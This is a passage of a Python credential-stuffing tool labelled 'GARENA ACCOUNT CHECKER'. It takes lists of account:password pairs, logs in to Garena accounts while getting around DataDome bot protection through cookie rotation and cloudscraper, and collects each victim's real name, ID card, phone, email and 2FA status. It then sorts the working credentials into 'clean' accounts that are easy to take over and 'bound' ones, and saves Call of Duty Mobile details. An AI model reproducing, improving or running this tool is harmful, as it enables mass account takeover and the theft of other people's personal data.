                if isinstance(roles_data.get("role"), list) and roles_data["role"]:
                    role = roles_data["role"][0]
                elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                    role = roles_data[app_id][0].get("role", None)
                
                if role:
                    detected_roles[app_id] = role
                    game_info.append(f"[{region.upper()} - {game_name} - {role}]")
                    print(f"{colorama.Fore.GREEN}[FOUND] {game_name} - {role}{colorama.Style.RESET_ALL}")
                else:
                    print(f"{colorama.Fore.RED}[NOT FOUND] {game_name}..{colorama.Style.RESET_ALL}")
            
            except Exception as e:
                logger.warning(f"[WARNING] Error checking game {game_name} for {account}: {e}")
                print(f"{colorama.Fore.RED}[NOT FOUND] {game_name}..{colorama.Style.RESET_ALL}")
        
        if not game_info:
            game_info.append(f"[{region.upper()} - No Game Detected]")
            logger.info(f"[INFO] No games detected")
            
    except Exception as e:
        logger.error(f"[ERROR] Error getting game connections for {account}: {e}")
        game_info.append("[Error fetching game data]")
    
    return game_info

def parse_account_details(data):
    user_info = data.get('user_info', {})
    
    mobile_no = user_info.get('mobile_no', 'N/A')
    country_code = user_info.get('country_code', '')
    
    if mobile_no != 'N/A' and mobile_no and country_code:
        formatted_mobile = f"+{country_code}{mobile_no}"
    else:
        formatted_mobile = mobile_no
    
    mobile_bound = bool(mobile_no and mobile_no != 'N/A' and mobile_no.strip())
    
    email = user_info.get('email', 'N/A')
    email_verified = bool(user_info.get('email_v', 0))
    email_actually_bound = bool(email != 'N/A' and email and email_verified)
    
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': email,
        'email_verified': email_verified,
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': country_code,
            'mobile_no': formatted_mobile,
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) else "Not Bound",
            'mobile_actually_bound': mobile_bound,
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        
        'binds': [],
        'game_info': []
    }

    if email_actually_bound:
        account_info['binds'].append('Email')
    
    if account_info['personal']['mobile_actually_bound']:
        account_info['binds'].append('Phone')
    
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    
    if account_info['personal']['id_card'] != 'N/A' and account_info['personal']['id_card']:
        account_info['binds'].append('ID Card')

    account_info['bind_status'] = "Clean" if not account_info['binds'] else f"Bound ({', '.join(account_info['binds'])})"
    account_info['is_clean'] = len(account_info['binds']) == 0

    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("⚠️ Suspicious")
    
    account_info['security_status'] = "✅ Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info

def save_account_details(account, password, details, codm_info=None):
    try:
        if not os.path.exists('Results'):
            os.makedirs('Results')
        
        codm_name = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if codm_info else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'

        with open('valid_accounts.txt', 'a', encoding='utf-8') as f:
            f.write(f"account: {account} | name: {codm_name} | uid: {codm_uid} | region: {codm_region}\n")
        
        if details['is_clean']:
            with open('Results/clean_accounts.txt', 'a', encoding='utf-8') as f:
                f.write(f"{account}:{password}\n")
            
            if codm_info:
                with open('Results/clean_codm.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{account}:{password} | CODM: {codm_name} | Level: {codm_level} | Region: {codm_region} | UID: {codm_uid}\n")
        else:
            bind_info = ', '.join(details['binds'])
            with open('Results/notclean_accounts.txt', 'a', encoding='utf-8') as f:
                f.write(f"{account}:{password} | Binds: {bind_info}\n")
            
            if codm_info:
                with open('Results/notclean_codm.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{account}:{password} | Binds: {bind_info} | CODM: {codm_name} | Level: {codm_level} | Region: {codm_region} | UID: {codm_uid}\n")
        
        if codm_info:
            with open('Results/codm_accounts.txt', 'a', encoding='utf-8') as f:
                f.write(f"{account}:{password} | Nickname: {codm_name} | Level: {codm_level} | Region: {codm_region} | UID: {codm_uid}\n")
        else:
            with open('Results/valid_no_codm.txt', 'a', encoding='utf-8') as f:
                f.write(f"{account}:{password} | UID: {details['uid']} | Username: {details['username']}\n")
        
        with open('Results/full_details.txt', 'a', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(f"Account: {account}\n")
            f.write(f"Password: {password}\n")
            f.write(f"UID: {details['uid']}\n")
            f.write(f"Username: {details['username']}\n")
            f.write(f"Nickname: {details['nickname']}\n")
            f.write(f"Email: {details['email'][:3]}****@{details['email'].split('@')[-1] if '@' in details['email'] else 'N/A'}\n")
            
            mobile_no = details['personal']['mobile_no']
            if mobile_no != 'N/A' and mobile_no and not mobile_no.startswith('****') and len(mobile_no) > 4:
                f.write(f"Phone: ****{mobile_no[-4:]}\n")
            else:
                f.write(f"Phone: ****\n")
                
            f.write(f"Country: {details['personal']['country']}\n")
            f.write(f"Bind Status: {details['bind_status']}\n")
            f.write(f"Security Status: {details['security_status']}\n")
            f.write(f"Avatar: {details['profile']['avatar']}\n")
            f.write(f"Signature: {details['profile']['signature']}\n")
            f.write(f"Game Connections: {' | '.join(details['game_info'])}\n")
            if codm_info:
                f.write(f"CODM Name: {codm_name}\n")
                f.write(f"CODM Level: {codm_level}\n")
                f.write(f"CODM Region: {codm_region}\n")
                f.write(f"CODM UID: {codm_uid}\n")
            f.write("=" * 60 + "\n\n")
            
    except Exception as e:
        logger.error(f"[ERROR] Error saving account details for {account}: {e}")

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats):
    try:
        datadome_manager.clear_session_datadome(session)
        
        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            success = datadome_manager.set_session_datadome(session, current_datadome)
            if success:
                logger.info(f"[INFO] Using existing DataDome cookie: {current_datadome[:30]}...")
            else:
                logger.warning(f"[WARNING] Failed to set existing DataDome cookie")
        else:
            datadome = get_datadome_cookie(session)
            if not datadome:
                live_stats.update_stats(valid=False)
                return f"[ERROR] {account}: DataDome cookie generation failed"
            datadome_manager.set_datadome(datadome)
            datadome_manager.set_session_datadome(session, datadome)
        
        v1, v2, new_datadome = prelogin(session, account, datadome_manager)
        
        if v1 == "IP_BLOCKED":
            return f"[ERROR] {account}: IP Blocked - New DataDome required"
        
        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: Invalid (Prelogin failed)"
        
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)
            logger.info(f"[INFO] Updated DataDome from prelogin: {new_datadome[:30]}...")
        
        sso_key = login(session, account, password, v1, v2)
        if not sso_key:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: Invalid (Login failed)"
        
        try:
            session.cookies.set('sso_key', sso_key, domain='.garena.com')
        except Exception as e:
            logger.warning(f"[WARNING] Error setting sso_key cookie: {e}")
        
        headers = {
            'accept': '*/*',
            'cookie': f'sso_key={sso_key}',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }
        
        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
        
        if response.status_code == 403:
            if datadome_manager.handle_403(session):
                return f"[ERROR] {account}: IP Blocked - New DataDome required"
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: Banned (Cookie flagged)"
            
        try:
            account_data = response.json()
        except json.JSONDecodeError as e:
            logger.error(f"[ERROR] Invalid JSON response from account init for {account}: {e}")
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: Invalid response from server"
        
        if 'error' in account_data:
            if account_data.get('error') == 'error_auth':
                live_stats.update_stats(valid=False)
                return f"[WARNING] {account}: Invalid (Authentication error)"
            live_stats.update_stats(valid=False)
            return f"[WARNING] {account}: Error fetching details ({account_data['error']})"
        
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})
        
        game_info = get_game_connections(session, account)
        details['game_info'] = game_info
        
        has_codm, codm_info = check_codm_account(session, account)
        
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)
            logger.info(f"[INFO] Fresh cookie obtained for next account")
        
        save_account_details(account, password, details, codm_info if has_codm else None)
        
        
        live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm)
        
        result = f"[SUCCESS] {account}: Valid ({details['bind_status']})"
        if has_codm:
            result += display_codm_info(account, codm_info)
        
        return result
        
    except Exception as e:
        logger.error(f"[ERROR] Unexpected error processing {account}: {e}")
        live_stats.update_stats(valid=False)
        return f"[ERROR] {account}: Processing error"

def get_fresh_cookie(session):
    try:
        cookies_dict = session.cookies.get_dict()
        return '; '.join([f'{k}={v}' for k, v in cookies_dict.items()])
    except Exception as e:
        logger.error(f"[ERROR] Error extracting fresh cookie: {e}")
        return None


def remove_checked_accounts(filename, processed_accounts):
    """
    Removes the processed accounts from the original input file.
    """
    try:
        
        with open(filename, 'r', encoding='utf-8') as f:
            all_lines = f.readlines()

        
        processed_set = set(processed_accounts)
        
       
        lines_to_keep = [
            line for line in all_lines 
            if line.strip() not in processed_set
        ]
        
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.writelines(lines_to_keep)
        
        logger.info(f"[CLEANUP] Removed {len(processed_accounts)} processed accounts from '{filename}'.")
    except Exception as e:
        logger.error(f"[ERROR] Failed to remove checked accounts from file: {e}")


def main():
    if not device_main():
        logger.error("Access denied. Exiting.")
        sys.exit(1)

    if not _check_integrity():
        logger.error("Integrity check failed after subscription. Exiting.")
        sys.exit(1)

    print("=" * 70)
    print("GARENA ACCOUNT CHECKER")
    print("LIVE STATS SYSTEM ENABLED")
    print("MULTI DATADOME COOKIE HANDLING")
    print("=" * 70)
    
    filename = input("Enter the filename containing accounts: ").strip()
    
    if not os.path.exists(filename):
        logger.error(f"[ERROR] File '{filename}' not found.")
        return
    
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    
    session = cloudscraper.create_scraper()
    
    initial_cookie = cookie_manager.get_valid_cookie()
    if initial_cookie:
        logger.info(f"[INFO] Using saved cookie")
        applyck(session, initial_cookie)
    else:
        logger.info(f"[INFO] No saved cookies found. Starting fresh session.")
        datadome = get_datadome_cookie(session)
        if datadome:
            datadome_manager.set_datadome(datadome)
            logger.info(f"[INFO] Generated initial DataDome cookie")
    
    with open(filename, 'r', encoding='utf-8') as file:
        accounts = [line.strip() for line in file if line.strip()]
    
    logger.info(f"[INFO] Total accounts to process: {len(accounts)}")
    
    processed_accounts = []
    
    def signal_handler(sig, frame):
        print("\n\n" + "="*50)
        logger.info("🛑 PROCESS INTERRUPTED BY USER (Ctrl+C)")
        final_stats = live_stats.get_stats()
        logger.info(f"[CURRENT SUMMARY]")
        logger.info(f"VALID: {final_stats['valid']} | INVALID: {final_stats['invalid']}")
        logger.info(f"CLEAN: {final_stats['clean']} | NOT CLEAN: {final_stats['not_clean']}")
        logger.info(f"CODM: {final_stats['codm']} | NO CODM: {final_stats['no_codm']}")
        logger.info(f"PROCESSED: {len(processed_accounts)}/{len(accounts)} accounts")
        
        
        if processed_accounts:
            remove_checked = input("\nRemove checked accounts from file? (y/n): ").strip().lower()
            if remove_checked == 'y':
                
                remove_checked_accounts(filename, processed_accounts)
        
        print("="*50)
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    for i, account_line in enumerate(accounts, 1):
        if ':' not in account_line:
            logger.warning(f"[WARNING] Skipping invalid account line: {account_line}")
            continue
            
        account, password = account_line.split(':', 1)
        account = account.strip()
        password = password.strip()
        
        logger.info(f"[INFO] Processing {i}/{len(accounts)}: {account}...")
        
        logger.info(live_stats.display_stats())
        
        result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats)
        logger.info(result)
        
        
        processed_accounts.append(account_line)
        
        time.sleep(1)
    
    final_stats = live_stats.get_stats()
    logger.info(f"\n[FINAL STATS] VALID: {final_stats['valid']} | INVALID: {final_stats['invalid']} | CLEAN: {final_stats['clean']} | NOT CLEAN: {final_stats['not_clean']} | CODM: {final_stats['codm']} | NO CODM: {final_stats['no_codm']}")
    
    remove_checked_accounts(filename, processed_accounts)

if __name__ == "__main__":
    main()